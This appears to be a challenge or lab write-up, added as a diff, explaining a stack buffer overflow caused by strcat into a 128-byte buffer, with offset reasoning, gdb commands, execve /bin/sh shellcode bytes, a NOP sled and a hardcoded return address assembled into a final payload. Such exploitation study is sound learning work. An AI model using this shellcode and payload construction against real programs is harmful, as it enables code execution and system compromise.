@@ -1,0 +1,58 @@
+The problem is in the main function more specifically in this part:
+
+char text[128] = {};
+char buffer[128] = {};
+fgets(buffer, sizeof(buffer), stdin); => so far so good we get the buffer from stdin
+strcat(text, "mo00oooo00o0o... "); => string = b'mo00oooo00o0o... ' ; print(len(string)) => 17 so alredy 17 bytes are filled of text[]
+strcat(text, buffer); => We can see the text with empty buffer with x/s [rbp-0x80]. It gives the string "mo00oooo00o0o... " which confirms that we can overflow the buffer.
+memset(buffer, 0, sizeof(buffer)); => wipes the buffer sent by the user but the damage is done on the text[] buffer
+
+This can be confirmed with:
+p.sendline(b'A'*111 + b'B' * 8 + b'C' * 8)
+
+We control RBP and RIP.
+
+How do we know which buffer is which if they are not initialized to 0? Buffer size=ecx×size of qword=0x10×8=128bytes.
+
+We can check our input buffer if we do a breakpoint in the fgets and do the following command x/50gx $rbp-0x100. 
+We notice that first of all we need to make sure our shellcode is aligned with the stack (spent hours on this).
+
+This was my original shellcode:
+
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
+
+If you notice the size is 23 bytes, after hours of debuging you need to align it with the stack so you add an \x90 extra (cannot add \x00 because strcpy will stop once it reaches \x00).
+
+Before our shellcode we need to add an op sled:
+
+
+payload = b'\x90' * (112 - len(shellcode)-8)
+
+
+Why the 112? Because 128 - 17 above = 111. That means our buffer ends in 111 and the RBP begins in 112. The -8 was just me testing if putting the shell between NOP works:
+
+payload = b'\x90' * (112 - len(shellcode)-8) + shellcode + b'\x90' * 8 
+
+Now we add the bytes for RBP remember it's 8-1 because of our shellcode, we need to align everything:
+
+payload = b'\x90' * (112 - len(shellcode)-8) + shellcode + b'\x90' * 8 + b'\x90' * 7 
+
+Time to find the jump_address.
+
+All we need to do is visualize the stack like so:
+
+ x/100gx $rbp-0x100
+
+This will print both buffers the text one and the buffer one. Then pick an address that is divisible by 8 and is in a NOP sled BEFORE our shellcode:
+
+0x7fffffffed70
+0x7fffffffed78
+0x7fffffffed80
+0x7fffffffed88
+
+Choose any or above just depends how you did your payload:
+jmp_address = p64(0x7fffffffed80)
+
+Final payload:
+
+payload = b'\x90' * (112 - len(shellcode)-8) + shellcode + b'\x90' * 8 + b'\x90' * 7  + jmp_address
